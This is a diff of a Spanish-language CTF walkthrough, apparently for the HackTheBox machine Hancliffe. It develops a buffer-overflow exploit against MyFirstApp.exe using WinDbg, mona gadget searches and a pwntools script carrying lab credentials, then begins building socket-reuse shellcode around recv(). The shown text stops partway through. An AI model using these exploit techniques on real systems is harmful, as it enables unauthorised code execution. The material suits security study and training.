+<code><span class="ro">0:000></span><span class="p"> db eax
+00d6fed6  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA  
+00d6fee6  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA  
+00d6fef6  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA  
+00d6ff06  41 41 41 41 41 41 41 41-41 41 41 41 41 41 42 42  AAAAAAAAAAAAAABB  
+00d6ff16  42 42 43 43 43 43 44 44-44 44 44 44 44 44 44 44  BBCCCCDDDDDDDDDD  
+00d6ff26  ab ab ab ab ab ab ab ab-00 00 00 00 00 00 00 4b  ...............K  
+00d6ff36  33 72 34 6a 40 40 6e 4d-34 6a 40 70 41 68 21 54  3r4j@@nM4j@pAh!T  
+00d6ff46  61 6c 66 69 61 6e 73 79-61 68 12 00 00 00 c0 3d  alfiansyah.....=  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">En lugar de saltar a <code class="language-plaintext highlighter-rouge">esp</code> saltaremos a <code class="language-plaintext highlighter-rouge">eax</code>, de esta forma tendremos <code class="language-plaintext highlighter-rouge">66</code> bytes disponibles, aun no son suficientes para un shellcode pero es mejor que los <code class="language-plaintext highlighter-rouge">10</code> bytes de antes, con <code class="language-plaintext highlighter-rouge">mona</code> podemos obtener una dirección que ejecute ese <code class="language-plaintext highlighter-rouge">jmp eax</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">0:000></span><span class="p"> !py mona jmp -r eax -m myfirstapp.exe
+Hold on...
+[+] Command used:
+!py C:\Users\user\Documents\windbg\x86\mona.py jmp -r eax -m myfirstapp.exe
+
+---------- Mona command started on 2024-07-24 20:15:21 (v2.0, rev 636) ----------
+[+] Processing arguments and criteria
+    - Pointer access level : X
+    - Only querying modules myfirstapp.exe
+[+] Generating module info table, hang on...
+    - Processing modules
+    - Done. Let's rock 'n roll.
+[+] Querying 1 modules
+    - Querying module MyFirstApp.exe
+    - Search complete, processing results
+[+] Preparing output file 'jmp.txt'
+    - (Re)setting logfile C:\mona\jmp.txt
+[+] Writing results to C:\mona\jmp.txt
+    - Number of pointers of type 'jmp eax' : 2 
+    - Number of pointers of type 'call eax' : 60 
+[+] Results : 
+0x719023b3 |   0x719023b3 : jmp eax |  {PAGE_EXECUTE_READ} [MyFirstApp.exe] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v-1.0-, 0x0  
+0x71902c5f |   0x71902c5f : jmp eax |  {PAGE_EXECUTE_READ} [MyFirstApp.exe] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v-1.0-, 0x0  
+0x71901212 |   0x71901212 : call eax |  {PAGE_EXECUTE_READ} [MyFirstApp.exe] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v-1.0-, 0x0  
+0x719015a6 |   0x719015a6 : call eax |  {PAGE_EXECUTE_READ} [MyFirstApp.exe] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v-1.0-, 0x0  
+0x7190167a |   0x7190167a : call eax |  {PAGE_EXECUTE_READ} [MyFirstApp.exe] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v-1.0-, 0x0  
+0x71901708 |   0x71901708 : call eax |  {PAGE_EXECUTE_READ} [MyFirstApp.exe] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v-1.0-, 0x0  
+0x7190172e |   0x7190172e : call eax |  {PAGE_EXECUTE_READ} [MyFirstApp.exe] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v-1.0-, 0x0  
+0x71901765 |   0x71901765 : call eax |  {PAGE_EXECUTE_READ} [MyFirstApp.exe] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v-1.0-, 0x0  
+0x71901778 |   0x71901778 : call eax |  {PAGE_EXECUTE_READ} [MyFirstApp.exe] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v-1.0-, 0x0  
+0x71901798 |   0x71901798 : call eax |  {PAGE_EXECUTE_READ} [MyFirstApp.exe] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v-1.0-, 0x0  
+0x719017a2 |   0x719017a2 : call eax |  {PAGE_EXECUTE_READ} [MyFirstApp.exe] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v-1.0-, 0x0  
+0x7190180e |   0x7190180e : call eax |  {PAGE_EXECUTE_READ} [MyFirstApp.exe] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v-1.0-, 0x0  
+0x7190185b |   0x7190185b : call eax |  {PAGE_EXECUTE_READ} [MyFirstApp.exe] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v-1.0-, 0x0  
+0x7190186e |   0x7190186e : call eax |  {PAGE_EXECUTE_READ} [MyFirstApp.exe] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v-1.0-, 0x0  
+0x719018a7 |   0x719018a7 : call eax |  {PAGE_EXECUTE_READ} [MyFirstApp.exe] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v-1.0-, 0x0  
+0x719018ba |   0x719018ba : call eax |  {PAGE_EXECUTE_READ} [MyFirstApp.exe] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v-1.0-, 0x0  
+0x719018da |   0x719018da : call eax |  {PAGE_EXECUTE_READ} [MyFirstApp.exe] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v-1.0-, 0x0  
+0x719018ea |   0x719018ea : call eax |  {PAGE_EXECUTE_READ} [MyFirstApp.exe] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v-1.0-, 0x0  
+0x719018f4 |   0x719018f4 : call eax |  {PAGE_EXECUTE_READ} [MyFirstApp.exe] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v-1.0-, 0x0  
+0x7190191f |   0x7190191f : call eax |  {PAGE_EXECUTE_READ} [MyFirstApp.exe] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v-1.0-, 0x0  
+... Please wait while I'm processing all remaining results and writing everything to file... 
+[+] Done. Only the first 20 pointers are shown here. For more pointers, open C:\mona\jmp.txt...
+    Found a total of 62 pointers</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ahora en la dirección de retorno ejecutaremos el <code class="language-plaintext highlighter-rouge">jmp eax</code> por lo que saltará al inicio de nuestro payload e intentará representar las <code class="language-plaintext highlighter-rouge">A's</code> que enviamos como junk</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="c1">#!/usr/bin/python3
 </span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">remote, log, sys, p32
 
 </span><span class="o">if </span><span class="no">len</span><span class="p">(sys.argv) </span><span class="o">< </span><span class="mi">2</span><span class="p">:
-    log.failure(</span><span class="no">f</span><span class="s">"Usage: python3 </span><span class="p">{sys.argv[</span><span class="mi">0</span><span class="p">]}</span><span class="s"> &ltport>"</span><span class="p">)  
-    sys.exit(</span><span class="mi">1</span><span class="p">)
-
-offset </span><span class="o">= </span><span class="mi">66</span><span class="p">
-junk </span><span class="o">= </span><span class="no">b</span><span class="s">"A" </span><span class="o">* </span><span class="p">offset
-jmpesp </span><span class="o">= </span><span class="p">p32(</span><span class="mi">0x7190239f</span><span class="p">)
-stack </span><span class="o">= </span><span class="no">b</span><span class="s">"C" </span><span class="o">* </span><span class="mi">50</span><span class="p">
-
-payload </span><span class="o">= </span><span class="p">junk </span><span class="o">+ </span><span class="p">jmpesp </span><span class="o">+ </span><span class="p">stack
-
-shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"192.168.100.5"</span><span class="p">, sys.argv[</span><span class="mi">1</span><span class="p">])
-
-shell.sendlineafter(</span><span class="no">b</span><span class="s">"Username: "</span><span class="p">,</span><span class="no"> b</span><span class="s">"alfiansyah"</span><span class="p">)
-shell.sendlineafter(</span><span class="no">b</span><span class="s">"Password: "</span><span class="p">,</span><span class="no"> b</span><span class="s">"K3r4j@@nM4j@pAh!T"</span><span class="p">)
-shell.sendlineafter(</span><span class="no">b</span><span class="s">"FullName: "</span><span class="p">,</span><span class="no"> b</span><span class="s">"Vickry Alfiansyah"</span><span class="p">)
-shell.sendlineafter(</span><span class="no">b</span><span class="s">"Input Your Code: "</span><span class="p">, payload)</span>
-</code></pre></div></div><br>
-
-<a href="/hackthebox/hancliffe/16.png" target="_blank"><div><p><img src="/hackthebox/hancliffe/16.png"></p></div></a>
-
-<p class="plain-text">La solución seria buscar una dirección que salte al inicio del input que es <code class="language-plaintext highlighter-rouge">EAX</code></p>
-<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="p">mona("jmp -r eax -m myfirstapp.exe")</span>
-</code></pre></div></div><br>
-<a href="/hackthebox/hancliffe/26.png" target="_blank"><div><p><img src="/hackthebox/hancliffe/26.png"></p></div></a>
-
-<p class="plain-text">De esta manera al ejecutar un <code class="language-plaintext highlighter-rouge">jmp eax</code> el programa llevara el <code class="language-plaintext highlighter-rouge">EIP</code> a <code class="language-plaintext highlighter-rouge">EAX</code> y ejecutara lo que hayamos enviado al inicio que son las <code class="language-plaintext highlighter-rouge">A's</code>, de esta manera tenemos todo el espacio del <code class="language-plaintext highlighter-rouge">junk</code> que son <code class="language-plaintext highlighter-rouge">66</code> bytes que nos permiten ejecutar mas instrucciones</p>
-<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="c1">#!/usr/bin/python3
-</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">remote, log, sys, p32
-
-</span><span class="o">if </span><span class="no">len</span><span class="p">(sys.argv) </span><span class="o">< </span><span class="mi">2</span><span class="p">:
-    log.failure(</span><span class="no">f</span><span class="s">"Usage: python3 </span><span class="p">{sys.argv[</span><span class="mi">0</span><span class="p">]}</span><span class="s"> &ltport>"</span><span class="p">)  
+    log.failure(</span><span class="no">f</span><span class="s">"Usage: python3 </span><span class="p">{sys.argv[</span><span class="mi">0</span><span class="p">]}</span><span class="s"> &ltport>"</span><span class="p">)
     sys.exit(</span><span class="mi">1</span><span class="p">)
 
 offset </span><span class="o">= </span><span class="mi">66</span><span class="p">
@@ -906,20 +676,69 @@ payload </span><span class="o">= </span><span class="p">junk </span><span class=
 shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"192.168.100.5"</span><span class="p">, sys.argv[</span><span class="mi">1</span><span class="p">])
 
 shell.sendlineafter(</span><span class="no">b</span><span class="s">"Username: "</span><span class="p">,</span><span class="no"> b</span><span class="s">"alfiansyah"</span><span class="p">)
-shell.sendlineafter(</span><span class="no">b</span><span class="s">"Password: "</span><span class="p">,</span><span class="no"> b</span><span class="s">"K3r4j@@nM4j@pAh!T"</span><span class="p">)
-shell.sendlineafter(</span><span class="no">b</span><span class="s">"FullName: "</span><span class="p">,</span><span class="no"> b</span><span class="s">"Vickry Alfiansyah"</span><span class="p">)
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"Password: "</span><span class="p">,</span><span class="no"> b</span><span class="s">"K3r4j@@nM4j@pAh!T"</span><span class="p">)  
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"FullName: "</span><span class="p">,</span><span class="no"> b</span><span class="s">"Vickry Alfiansyah"</span><span class="p">)  
 shell.sendlineafter(</span><span class="no">b</span><span class="s">"Input Your Code: "</span><span class="p">, payload)</span>
 </code></pre></div></div><br>
 
-<a href="/hackthebox/hancliffe/17.png" target="_blank"><div><p><img src="/hackthebox/hancliffe/17.png"></p></div></a>
+<p class="plain-text">Podemos comprobarlo ejecutando el exploit, al caer en el breakpoint del salto y ejecutarlo podemos ver que ahora en <code class="language-plaintext highlighter-rouge">eip</code> están las <code class="language-plaintext highlighter-rouge">A's</code>, pero aun tenemos la limitación de solo <code class="language-plaintext highlighter-rouge">66</code> bytes, en este post veremos <code class="language-plaintext highlighter-rouge">3</code> formas de explotación</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">0:000> </span><span class="p">bp 0x719023b3
+
+</span><span class="ro">0:000> </span><span class="p">g
+Breakpoint 0 hit
+eax=0101fed6 ebx=00000138 ecx=00c13b70 edx=000a7190 esi=71901a3d edi=71901a3d  
+eip=719023b3 esp=0101ff1c ebp=41414141 iopl=0         nv up ei pl zr na pe nc  
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246  
+MyFirstApp+0x23b3:
+719023b3 ffe0            jmp     eax {0101fed6}
+
+</span><span class="ro">0:000></span><span class="p"> p
+eax=0101fed6 ebx=00000138 ecx=00c13b70 edx=000a7190 esi=71901a3d edi=71901a3d  
+eip=0101fed6 esp=0101ff1c ebp=41414141 iopl=0         nv up ei pl zr na pe nc  
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246  
+0101fed6 41              inc     ecx
+
+</span><span class="ro">0:000></span><span class="p"> db eip
+0101fed6  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
+0101fee6  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
+0101fef6  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
+0101ff06  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
+0101ff16  41 41 b3 23 90 71 0a 00-c1 00 90 3b c1 00 50 00  AA.#.q.....;..P.
+0101ff26  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 4b  ...............K
+0101ff36  33 72 34 6a 40 40 6e 4d-34 6a 40 70 41 68 21 54  3r4j@@nM4j@pAh!T
+0101ff46  61 6c 66 69 61 6e 73 79-61 68 12 00 00 00 90 3b  alfiansyah.....;</span>
+</code></pre></div></div><br>
+
 
 </section>
 
 <section class="post" id="bof-socketreuse">
 <br><h3 class="post-title">Buffer Overflow - socket reuse</h3><br>
 
-<p class="plain-text">La primera forma de explotarlo es haciendo uso de la funcion <code class="language-plaintext highlighter-rouge">recv()</code> que importa el exe para abrir de nuevo el <code class="language-plaintext highlighter-rouge">socket</code> y ahi poder enviar nuestro shellcode a ejecutar</p>
-<a href="/hackthebox/hancliffe/8.png" target="_blank"><div><p><img src="/hackthebox/hancliffe/8.png"></p></div></a>
+<p class="plain-text">La primera forma de explotarlo es haciendo uso de la funcion <code class="language-plaintext highlighter-rouge">recv()</code> para recibir datos de nuevo del <code class="language-plaintext highlighter-rouge">socket</code> y ahi poder enviar nuestro shellcode a ejecutar</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">0:000></span><span class="p"> !py mona getiat -m myfirstapp.exe -s recv
+Hold on...
+[+] Command used:
+!py C:\Users\user\Documents\windbg\x86\mona.py getiat -m myfirstapp.exe -s recv
+
+---------- Mona command started on 2024-07-24 20:18:34 (v2.0, rev 636) ----------
+[+] Processing arguments and criteria
+    - Pointer access level : X
+    - Only querying modules myfirstapp.exe
+[+] Generating module info table, hang on...
+    - Processing modules
+    - Done. Let's rock 'n roll.
+[+] Querying 1 modules
+[+] Preparing output file 'iatsearch.txt'
+    - (Re)setting logfile C:\mona\iatsearch.txt
+    Getting IAT for MyFirstApp.exe.
+    Enumerating IAT
+0x719082ac | At 0x719082ac in myfirstapp (base + 0x000082ac) : 0x766e5f50 (ptr to WS2_32.recv)  - [WS2_32] ASLR: True, Rebase: True, SafeSEH: False, CFG: True, OS: True, v10.0.22621.1 WS2_32.dll, 0x4140  
+
+1 entries found</span>
+</code></pre></div></div><br>
 
 <p class="plain-text">Mirando la <a href="https://learn.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-recv">documentación</a> esta funcion requiere 4 parametros, el <code class="language-plaintext highlighter-rouge">descriptor</code> del socket, la <code class="language-plaintext highlighter-rouge">direccion</code> donde se escribiran los datos, la <code class="language-plaintext highlighter-rouge">longitud</code> maxima que podra recibir y por ultimo las <code class="language-plaintext highlighter-rouge">flags</code> que generalmente se puede dejar simplemente en <code class="language-plaintext highlighter-rouge">0</code></p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
@@ -931,31 +750,55 @@ shell.sendlineafter(</span><span class="no">b</span><span class="s">"Input Your 
 );</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Estos <code class="language-plaintext highlighter-rouge">argumentos</code> se pasan simplemente haciendoles un <code class="language-plaintext highlighter-rouge">push</code> en orden inverso para dejarlos en la pila, para entenderlo podemos hacer un breakpoint en el <code class="language-plaintext highlighter-rouge">recv</code></p>
-<a href="/hackthebox/hancliffe/18.png" target="_blank"><div><p><img src="/hackthebox/hancliffe/18.png"></p></div></a>
-
-<p class="plain-text">Podemos ver el descriptor del socket en la direccion <code class="language-plaintext highlighter-rouge">0x0245ff1c</code> justo en la pila que es <code class="language-plaintext highlighter-rouge">000002E0</code> que aunque no lo podemos usar ya que esta almacenado en el <code class="language-plaintext highlighter-rouge">ESP</code> un poco mas abajo tambien lo encontramos en la dirección <code class="language-plaintext highlighter-rouge">0x0245ff64</code></p>
-<a href="/hackthebox/hancliffe/19.png" target="_blank"><div><p><img src="/hackthebox/hancliffe/19.png"></p></div></a>
-
-<p class="plain-text">Haciendo un calculo rapido sabemos este tambien se encuentra en <code class="language-plaintext highlighter-rouge">ESP + 0x48</code></p>
+<p class="plain-text">Estos <code class="language-plaintext highlighter-rouge">argumentos</code> se pasan simplemente haciendoles un <code class="language-plaintext highlighter-rouge">push</code> en orden inverso para dejarlos en la pila, para entenderlo podemos hacer un breakpoint en el <code class="language-plaintext highlighter-rouge">recv</code>, los argumentos podemos establecerlos a nuestro gusto excepto uno, el descriptor del socket ya que al reutilizarlo necesitamos que sea el mismo que el inicial</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">❯ python3 </span><span class="p">-q
->>> </span><span class="p">hex</span><span class="p">(</span><span class="p">0x0245ff64 </span><span class="p">- </span><span class="p">0x0245ff1c</span><span class="p">)  
-'0x48'
->>></span>
+<code><span class="ro">0:000></span><span class="p"> bp 0x71901d74
+
+</span><span class="ro">0:000></span><span class="p"> g
+Breakpoint 0 hit
+eax=00000140 ebx=00000140 ecx=00000002 edx=00fcff08 esi=71901a3d edi=71901a3d
+eip=71901d74 esp=00fcff1c ebp=00fcff74 iopl=0         nv up ei pl nz na po nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202
+MyFirstApp+0x1d74:
+71901d74 a1ac829071      mov     eax,dword ptr [MyFirstApp+0x82ac (719082ac)] ds:002b:719082ac={WS2_32!recv (766e5f50)}  
+
+</span><span class="ro">0:000></span><span class="p"> dds esp L4
+00fcff1c  00000140
+00fcff20  00bc36e0
+00fcff24  00000400
+00fcff28  00000000</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">La primera instruccion que ejecutaremos sera mover a <code class="language-plaintext highlighter-rouge">ESI</code> el contenido de la direccion <code class="language-plaintext highlighter-rouge">ESP + 0x48</code> para asi almacenarlo y mas adelante hacerle un <code class="language-plaintext highlighter-rouge">push</code> al final</p>
+<p class="plain-text">Unas instrucciones antes de la llamada podemos ver como establece los argumentos, el primero que es el descriptor lo toma de <code class="language-plaintext highlighter-rouge">ebp - 0x10</code>, sabemos su ubicación pero no podemos tomarla relativa a <code class="language-plaintext highlighter-rouge">ebp</code> ya que al explotar el buffer overflow sobrescribimos este puntero, asi que podemos calcularla relativa a <code class="language-plaintext highlighter-rouge">esp</code> que sería <code class="language-plaintext highlighter-rouge">esp + 0x48</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">0:000></span><span class="p"> u eip-6 L4
+MyFirstApp+0x1d6e:
+71901d6e 8b45f0          mov     eax,dword ptr [ebp-10h]
+71901d71 890424          mov     dword ptr [esp],eax
+71901d74 a1ac829071      mov     eax,dword ptr [MyFirstApp+0x82ac (719082ac)]  
+71901d79 ffd0            call    eax
+
+</span><span class="ro">0:000></span><span class="p"> dd ebp - 0x10 L1
+00fcff64  00000140
+
+</span><span class="ro">0:000></span><span class="p"> ? (ebp - 0x10) - esp
+Evaluate expression: 72 = 00000048
+
+</span><span class="ro">0:000></span><span class="p"> dd esp + 0x48 L1
+00fcff64  00000140</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">La primera instruccion que ejecutaremos sera mover a <code class="language-plaintext highlighter-rouge">esi</code> el contenido de la direccion <code class="language-plaintext highlighter-rouge">esp + 0x48</code> para asi almacenar el descriptor antes de alterar el stack</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="c1">#!/usr/bin/python3
 </span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">remote, log, sys, p32, asm
 
 </span><span class="o">if </span><span class="no">len</span><span class="p">(sys.argv) </span><span class="o">< </span><span class="mi">2</span><span class="p">:
-    log.failure(</span><span class="no">f</span><span class="s">"Usage: python3 </span><span class="p">{sys.argv[</span><span class="mi">0</span><span class="p">]}</span><span class="s"> &ltport>"</span><span class="p">)  
+    log.failure(</span><span class="no">f</span><span class="s">"Usage: python3 </span><span class="p">{sys.argv[</span><span class="mi">0</span><span class="p">]}</span><span class="s"> &ltport>"</span><span class="p">)
     sys.exit(</span><span class="mi">1</span><span class="p">)
 
 recv  </span><span class="o">= </span><span class="no">b</span><span class="s">""</span><span class="p">
-recv </span><span class="o">+= </span><span class="p">asm(</span><span class="s">"mov esi, dword ptr ds:[esp + 0x48]"</span><span class="p">)
+recv </span><span class="o">+= </span><span class="p">asm(</span><span class="s">"mov esi, [esp + 0x48]"</span><span class="p">)
 
 offset </span><span class="o">= </span><span class="mi">66</span><span class="p">
 junk </span><span class="o">= </span><span class="no">b</span><span class="s">"A" </span><span class="o">* </span><span class="p">(offset </span><span class="o">- </span><span class="no">len</span><span class="p">(recv))
@@ -967,62 +810,261 @@ payload </span><span class="o">= </span><span class="p">recv </span><span class=
 shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"192.168.100.5"</span><span class="p">, sys.argv[</span><span class="mi">1</span><span class="p">])
 
 shell.sendlineafter(</span><span class="no">b</span><span class="s">"Username: "</span><span class="p">,</span><span class="no"> b</span><span class="s">"alfiansyah"</span><span class="p">)
-shell.sendlineafter(</span><span class="no">b</span><span class="s">"Password: "</span><span class="p">,</span><span class="no"> b</span><span class="s">"K3r4j@@nM4j@pAh!T"</span><span class="p">)
-shell.sendlineafter(</span><span class="no">b</span><span class="s">"FullName: "</span><span class="p">,</span><span class="no"> b</span><span class="s">"Vickry Alfiansyah"</span><span class="p">)
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"Password: "</span><span class="p">,</span><span class="no"> b</span><span class="s">"K3r4j@@nM4j@pAh!T"</span><span class="p">)  
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"FullName: "</span><span class="p">,</span><span class="no"> b</span><span class="s">"Vickry Alfiansyah"</span><span class="p">)  
 shell.sendlineafter(</span><span class="no">b</span><span class="s">"Input Your Code: "</span><span class="p">, payload)</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Al ejecutar la instruccion despues de saltar a <code class="language-plaintext highlighter-rouge">EAX</code> podemos ver que el descriptor del socket <code class="language-plaintext highlighter-rouge">000002E0</code> se ha almacenado correctamente en el registro <code class="language-plaintext highlighter-rouge">ESI</code></p>
-<a href="/hackthebox/hancliffe/20.png" target="_blank"><div><p><img src="/hackthebox/hancliffe/20.png"></p></div></a>
+<p class="plain-text">Al ejecutar la instruccion despues de saltar a <code class="language-plaintext highlighter-rouge">eax</code> podemos ver que el descriptor del socket se ha almacenado correctamente en el registro <code class="language-plaintext highlighter-rouge">esi</code> que usaremos después</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">0:000></span><span class="p"> bp 0x719023b3
 
-<p class="plain-text">Antes de seguir tenemos que solucionar un problema y es que si seguimos enviando instrucciones terminaremos por solaparnos con <code class="language-plaintext highlighter-rouge">ESP</code>, para solucionarlo podemos restarle <code class="language-plaintext highlighter-rouge">0x64</code> a ESP para que asi este arriba de <code class="language-plaintext highlighter-rouge">EIP</code> y no entre en conflicto</p>
+</span><span class="ro">0:000></span><span class="p"> g
+Breakpoint 0 hit
+eax=00f8fed6 ebx=0000013c ecx=00d83b70 edx=000a7190 esi=71901a3d edi=71901a3d
+eip=719023b3 esp=00f8ff1c ebp=41414141 iopl=0         nv up ei pl zr na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
+MyFirstApp+0x23b3:
+719023b3 ffe0            jmp     eax {00f8fed6}
+
+</span><span class="ro">0:000></span><span class="p"> p
+eax=00f8fed6 ebx=0000013c ecx=00d83b70 edx=000a7190 esi=71901a3d edi=71901a3d
+eip=00f8fed6 esp=00f8ff1c ebp=41414141 iopl=0         nv up ei pl zr na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
+00f8fed6 8b742448        mov     esi,dword ptr [esp+48h] ss:002b:00f8ff64=0000013c  
+
+</span><span class="ro">0:000></span><span class="p"> p
+eax=00f8fed6 ebx=0000013c ecx=00d83b70 edx=000a7190 esi=0000013c edi=71901a3d
+eip=00f8feda esp=00f8ff1c ebp=41414141 iopl=0         nv up ei pl zr na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
+00f8feda 41              inc     ecx
+
+</span><span class="ro">0:000></span><span class="p"> r esi
+esi=0000013c</span>
+</code></pre></div></div><br>
+
+
+<p class="plain-text">Antes de seguir tenemos que solucionar un problema y es que si seguimos enviando instrucciones terminaremos por solaparnos con <code class="language-plaintext highlighter-rouge">esp</code>, para solucionarlo podemos restarle <code class="language-plaintext highlighter-rouge">0x64</code> al stack para que asi este arriba de <code class="language-plaintext highlighter-rouge">eip</code> y no entre en conflicto</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="p">recv </span><span class="o">+= </span><span class="p">asm(</span><span class="s">"sub esp, 0x64"</span><span class="p">)</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Ya almacenado el descriptor empezaremos a enviar los argumentos en orden inverso, el primero son las <code class="language-plaintext highlighter-rouge">flags</code> que lo dejaremos en <code class="language-plaintext highlighter-rouge">0</code>, sin embargo para evitar <code class="language-plaintext highlighter-rouge">null</code> bytes ya que son badchars haremos un <code class="language-plaintext highlighter-rouge">xor ebx, ebx</code> para que ebx valga <code class="language-plaintext highlighter-rouge">0</code></p>
+<p class="plain-text">Ya almacenado el descriptor empezaremos a enviar los argumentos en orden inverso, el primero son las <code class="language-plaintext highlighter-rouge">flags</code> que lo dejaremos en <code class="language-plaintext highlighter-rouge">0</code>, sin embargo para evitar <code class="language-plaintext highlighter-rouge">null</code> bytes ya que pueden dar problemas ejecutaremos <code class="language-plaintext highlighter-rouge">xor ebx, ebx</code> ya que al ejecutar el xor consigo mismo el resultado será <code class="language-plaintext highlighter-rouge">0</code>, ahora podemos empujar el valor de <code class="language-plaintext highlighter-rouge">ebx</code></p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="p">recv </span><span class="o">+= </span><span class="p">asm(</span><span class="s">"xor ebx, ebx"</span><span class="p">)
 recv </span><span class="o">+= </span><span class="p">asm(</span><span class="s">"push ebx"</span><span class="p">)</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Al hacer un <code class="language-plaintext highlighter-rouge">XOR</code> de <code class="language-plaintext highlighter-rouge">EBX</code> por si mismo este pasa a valer <code class="language-plaintext highlighter-rouge">0</code> y al hacerle un <code class="language-plaintext highlighter-rouge">push</code> lo enviamos al <code class="language-plaintext highlighter-rouge">ESP</code>, asi almacenamos el ultimo argumentos que son las <code class="language-plaintext highlighter-rouge">flags</code></p>
-<a href="/hackthebox/hancliffe/21.png" target="_blank"><div><p><img src="/hackthebox/hancliffe/21.png"></p></div></a>
-
-<p class="plain-text">El siguiente argumento es la longitud a recibir, anteriormente estaba en <code class="language-plaintext highlighter-rouge">400</code> pero para evitar null bytes usaremos <code class="language-plaintext highlighter-rouge">410</code>, aprovechando que el registro <code class="language-plaintext highlighter-rouge">EBX</code> actualmente vale <code class="language-plaintext highlighter-rouge">0</code> le sumamos <code class="language-plaintext highlighter-rouge">0x410</code> y le hacemos un <code class="language-plaintext highlighter-rouge">push</code> para asi subirlo a la pila</p>
+<p class="plain-text">El siguiente argumento es la longitud a recibir, anteriormente cuando vimos la llamada estaba establecido en <code class="language-plaintext highlighter-rouge">0x400</code> sin embargo esto puede ocasionar null bytes, asi que como <code class="language-plaintext highlighter-rouge">ebx</code> vale <code class="language-plaintext highlighter-rouge">0</code> podemos mover <code class="language-plaintext highlighter-rouge">0x04</code> a <code class="language-plaintext highlighter-rouge">bh</code> que es el registro mas alto del subregistro <code class="language-plaintext highlighter-rouge">bx</code>, y como <code class="language-plaintext highlighter-rouge">bl</code> aun vale <code class="language-plaintext highlighter-rouge">0x00</code> el registro <code class="language-plaintext highlighter-rouge">ebx</code> almacena <code class="language-plaintext highlighter-rouge">0x400</code></p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="p">recv </span><span class="o">+= </span><span class="p">asm(</span><span class="s">"add bx, 0x410"</span><span class="p">)
